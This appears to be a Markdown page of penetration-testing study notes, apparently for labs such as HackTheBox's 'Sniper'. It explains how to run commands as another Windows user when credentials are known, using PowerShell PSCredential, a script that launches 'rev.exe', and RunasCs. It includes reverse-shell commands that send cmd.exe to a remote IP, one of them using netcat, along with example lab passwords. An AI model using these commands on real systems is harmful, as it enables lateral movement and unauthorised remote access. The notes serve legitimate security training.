---
publish: true
created: 2026-02-24T19:44:34.410+05:30
modified: 2026-06-22T08:53:13.648+05:30
---

**Scenario**: You have username, password of an account/user, but the current shell is low privileged.

# PScredential

## Shell

```
# Trigger powershell first.
powershell

# check the hostname and save credentials
PS C:\> hostname
Sniper
PS C:\> $user = "Sniper\Chris"
PS C:\> $pass = "36mEAhz/B8xQ~2VM"
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
PS C:\> Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
sniper\chris
```

## powershell script

<https://notchxor.github.io/oscp-notes/4-win-privesc/14-runas/>

```
$secpasswd = ConvertTo-SecureString 'Tikkycoll_431012284' -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("c.bum", $secpasswd)
$computer = "g0"
[System.Diagnostics.Process]::Start("C:\ProgramData\rev.exe","", $mycreds.Username, $mycreds.Password, $computer)
```

save as `runme.ps1` and execute with `. .\runme.ps1`

# RunasCs

exe - <https://github.com/antonioCoco/RunasCs/releases>
ppowershell script - <https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1>

this allows you to trigger the non-interactive cmd as another user and redirect stdin / stdout to remote ip:port

```
.\RunasCs.exe username password cmd.exe -r 10.10.14.53:1235
```

interactive cmd

```
# upload nc.exe, then
RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
```
